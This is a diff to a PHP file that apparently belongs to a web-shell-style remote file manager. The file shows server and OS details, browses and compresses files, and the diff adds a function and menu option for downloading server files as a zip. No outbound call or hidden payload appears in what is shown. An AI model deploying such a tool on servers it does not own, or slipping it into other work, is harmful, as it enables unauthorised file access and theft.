@@ -72,7 +72,7 @@ if(!function_exists('get_server_info')){
 	function get_server_info(){
 		$server_addr = isset($_SERVER['SERVER_ADDR'])? $_SERVER['SERVER_ADDR']:$_SERVER["HTTP_HOST"];
 		$server_info['ip_adrress'] = "Server IP : ".$server_addr." <span class='strong'>|</span> Your IP : <span id='client_ip'>".$_SERVER['REMOTE_ADDR']."</span>";
-		$server_info['time_at_server'] = "Time <span class='strong'>@</span> Server : <span id='server_date'>".@date("d M Y H:i:s",time())."</span>";
+		$server_info['time_at_server'] = "Time <span class='strong'>@</span> Server : <span id='server_date'>".@date("d-M-Y H:i:s",time())."</span>";
 		$server_info['uname'] = php_uname();
 		$server_software = (getenv('SERVER_SOFTWARE')!='')? getenv('SERVER_SOFTWARE')." <span class='strong'>|</span> ":'';
 		$server_info['software'] = $server_software."  PHP ".phpversion();		
@@ -296,8 +296,7 @@ if(!function_exists('compress')){
 		if($type=='zip'){
 			if(zip($files, $archive)) return true;
 			else return false;
-		}
-		elseif(($type=='tar')||($type=='targz')){
+		}elseif(($type=='tar')||($type=='targz')){
 			$archive = basename($archive);
 
 			$listsBasename = array_map("basename", $files);
@@ -772,6 +771,7 @@ if(!function_exists('show_all_files')){
 		<option>compress (tar.gz)</option>
 		<option>compress (zip)</option>
 		<option disabled>------------</option>
+		<option>download (zip)</option>
 		</select>
 		</td><td colspan='".$colspan."'></td></tr>
 		<tr><td></td><td colspan='".++$colspan."'>".$totalFiles." file(s), ".$totalFolders." Folder(s)<span class='xplSelected'></span></td></tr>
@@ -997,7 +997,7 @@ if(!function_exists('output')){
 		header("Content-Type: text/plain; charset=utf-8");
 		header("Cache-Control: no-cache");
 		header("Pragma: no-cache");
-		$header = @date("d M Y H:i:s",time()).'|'.$_SERVER['REMOTE_ADDR'];
+		$header = @date("d-M-Y H:i:s",time()).'|'.$_SERVER['REMOTE_ADDR'];
         if ($err != null) {
             $str = $header.'|1|'.from_encode($err);
         } else {
@@ -1046,6 +1046,24 @@ if ( !function_exists( 'hex2bin' ) ) {
             $sbin .= pack( "H*", substr( $str, $i, 2 ) );
         }
         return $sbin;
+    }
+}
+
+if(!function_exists('download_file')) {
+    function download_file($file) {
+        header("Content-Type: application/octet-stream");
+        header('Content-Transfer-Encoding: binary');
+        header("Content-length: ".filesize($file));
+        header("Cache-Control: no-cache");
+        header("Pragma: no-cache");
+        header("Content-disposition: attachment; filename=\"".basename($file)."\";");
+        $handler = fopen($file,"rb");
+        while(!feof($handler)){
+            print(fread($handler, 1024*8));
+            @ob_flush();
+            @flush();
+        }
+        fclose($handler);
     }
 }
 
